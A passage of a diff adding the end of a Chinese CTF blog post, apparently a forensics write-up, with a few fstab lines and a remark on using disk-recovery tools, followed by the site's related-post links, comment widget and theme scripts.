+</span></span><span class="line"><span class="cl">tmpfs                  /tmp          tmpfs     nodev,nosuid          <span class="m">0</span>      <span class="m">0</span>
+</span></span><span class="line"><span class="cl">/dev/sda1              /             ext4      defaults,noatime      <span class="m">0</span>      <span class="m">1</span>
+</span></span><span class="line"><span class="cl">/dev/sda2              none          swap      defaults              <span class="m">0</span>      <span class="m">0</span>
+</span></span><span class="line"><span class="cl">/dev/sda3              /home         ext4      defaults,noatime      <span class="m">0</span>      <span class="m">2</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里应该就能查询到谁挂载了根目录，然后磁盘取证掏rstudio这类工具就能梭哈了</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf/">CTF</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under 9u_l3</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/2026polarisctf%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2026polarisctf%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/1.ef1d805156976ef40c35c77919eb80cc.webp" 
+                        width="2489" 
+                        height="1400" 
+                        loading="lazy"
+                        alt="Featured image of post 2026PolarisCTF出题小记"
+                        
+                        data-hash="md5-7x2AUVaXbvQMNcd5GeuAzA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2026PolarisCTF出题小记</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2026suctfwp/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2026suctfwp/1.a4dfd8c82e097527ea3d8c3666c75138.jpg" 
+                        width="1526" 
+                        height="2500" 
+                        loading="lazy"
+                        alt="Featured image of post 2026SUCTFwp"
+                        
+                        data-hash="md5-pN/YyC4JdSfqPYw2ZsdROA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2026SUCTFwp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2026%E9%98%BF%E9%87%8C%E4%BA%91ctf%E5%A4%8D%E7%8E%B0/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2026%E9%98%BF%E9%87%8C%E4%BA%91ctf%E5%A4%8D%E7%8E%B0/1.2c83ad2d38aad34d20aa51cd153fc26a.jpg" 
+                        width="1400" 
+                        height="1304" 
+                        loading="lazy"
+                        alt="Featured image of post 2026阿里云ctf复现"
+                        
+                        data-hash="md5-LIOtLTiq000gqlHNFT/Cag==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2026阿里云ctf复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2026lilacctfwp/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2026lilacctfwp/1.89f58f9561e8f7cdc8e239f4ad4a1d42.png" 
+                        width="2200" 
+                        height="1238" 
+                        loading="lazy"
+                        alt="Featured image of post 2026LilacCTFwp"
+                        
+                        data-hash="md5-ifWPlWHo983I4jn0rUodQg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2026LilacCTFwp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/2025ciscnccb%E5%88%9D%E8%B5%9Bwp/">
+        
+        
+            <div class="article-image">
+                <img src="/p/2025ciscnccb%E5%88%9D%E8%B5%9Bwp/1.8f7f84a3aea2332ae0f974d58d84d8df.jpg" 
+                        width="3440" 
+                        height="1440" 
+                        loading="lazy"
+                        alt="Featured image of post 2025ciscn&amp;ccb初赛wp"
+                        
+                        data-hash="md5-j3&#43;Eo66iMyrg&#43;XTVjYTY3w==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025ciscn&amp;ccb初赛wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
+<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
+<div id="waline" class="waline-container"></div>
+<style>
+    .waline-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+        --waline-font-size: var(--article-font-size);
+    }
+    .waline-container .wl-count {
+        color: var(--card-text-color-main);
+    }
+</style><script>
+    
+    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://unpkg.com/@waline/emojis@1.0.1/weibo"],"locale":{"admin":"Admin","placeholder":null},"requiredMeta":["name","email","url"],"serverURL":"https://waline-test-one-smoky.vercel.app"});
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 无敌可爱美咕噜
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<style>
+  body {
+    background: url(https://0d000721999.github.io/background/1.webp) no-repeat center top;
+    background-size: cover;
+    background-attachment: fixed;
+  }
+</style>
+
+ 
+<style>
+  @font-face {
+    font-family: 'ss';
+    src: url(https://0d000721999.github.io/font/SeriousShannsNerdFontMono-Regular.otf) format('opentype');
+  }
+
+  :root {
+    --base-font-family: 'ss';
+    --code-font-family: 'ss';
+  }
+</style>
+<style>
+    #TableOfContents > ul, ol {
+        ul, ol {
+            display: none;
+        }
+        .open {
+            display: block;
+        }
+    }
+</style>
+
+<script>
+    function initTocHide() {
+        
+        let toc = document.querySelector(".widget--toc");
+        if (!toc) {
+            return;
+        }
+        
+        window.addEventListener('scroll', function() {
+            
+            let openUl = document.querySelectorAll(".open");
+            if (openUl.length > 0) {
+              openUl.forEach((ul) => {
+                ul.classList.remove("open")
+              })
+            }
+            
+            let currentLi = document.querySelector(".active-class");
+            if (!currentLi) {
+                return
+            }
+            
+            if (currentLi.children.length > 1) {
+                currentLi.children[1].classList.add("open")
+            }
+            
+            let ul = currentLi.parentElement;
+            do {
+                ul.classList.add("open");
+                ul = ul.parentElement.parentElement
+            } while (ul !== undefined && (ul.localName === 'ul' || ul.localName === 'ol'))
+        });
+    }
+    initTocHide()
+</script>
+
+<style>
+    #backTopBtn {
+        display: none;
+        position: fixed;
+        bottom: 30px;
+        z-index: 99;
+        cursor: pointer;
+        width: 30px;
+        height: 30px;
+        background-image: url(https://0d000721999.github.io/icons/backTop.svg);
+    }
+</style>
+
+<script>
+    
+
+    function initScrollTop() {
+        let rightSideBar = document.querySelector(".right-sidebar");
+        if (!rightSideBar) {
+            return;
+        }
+        
+        let btn = document.createElement("div");
+        btn.id = "backTopBtn";
+        btn.onclick = backToTop
+        rightSideBar.appendChild(btn)
+        
+        window.onscroll = function() {
+            
+            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                btn.style.display = "block";
+            } else {
+                btn.style.display = "none";
+            }
+        };
+    }
+
+    
+
+    function backToTop(){
+        window.scrollTo({ top: 0, behavior: "smooth" })
+    }
+
+    initScrollTop();
+</script>
+
+
+<script>   
+  const cdnPath = "https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@f09405fd";
+  const cssPath = "https://0d000721999.github.io/waifu/waifu.css"
+  const config = {
+    
+    path: {
+      homePath: "/",
+      modelPath: cdnPath + "/Resources/",
+      cssPath: cssPath,
+      tipsJsonPath: cdnPath + "/waifu-tips.json",
+      tipsJsPath: cdnPath + "/waifu-tips.js",
+      live2dCorePath: cdnPath + "/Core/live2dcubismcore.js",
+      live2dSdkPath: cdnPath + "/live2d-sdk.js"
+    },
+    
+    tools: ["hitokoto", "asteroids", "express","photo", "quit"],
+    
+    drag: {
+      enable: true,
+      direction: ["x", "y"]
+    },
+    
+    switchType: "order"
+  }
+
+  
+  if (screen.width >= 768) {
+    Promise.all([
+      loadExternalResource(config.path.cssPath, "css"),
+      loadExternalResource(config.path.live2dCorePath, "js"),
+      loadExternalResource(config.path.live2dSdkPath, "js"),
+      loadExternalResource(config.path.tipsJsPath, "js")
+    ]).then(() => {
+      initWidget({
+        waifuPath: config.path.tipsJsonPath,
+        cdnPath: config.path.modelPath,
+        tools: config.tools,
+        dragEnable: config.drag.enable,
+        dragDirection: config.drag.direction,
+        switchType: config.switchType
+      });
+    });
+  }
+
+  
+  function loadExternalResource(url, type) {
+    return new Promise((resolve, reject) => {
+      let tag;
+      if (type === "css") {
+        tag = document.createElement("link");
+        tag.rel = "stylesheet";
+        tag.href = url;
+      }
+      else if (type === "js") {
+        tag = document.createElement("script");
+        tag.src = url;
+      }
+      if (tag) {
+        tag.onload = () => resolve(url);
+        tag.onerror = () => reject(url);
+        document.head.appendChild(tag);
+      }
+    });
+  }
+</script>
+
+    </body>
+</html>
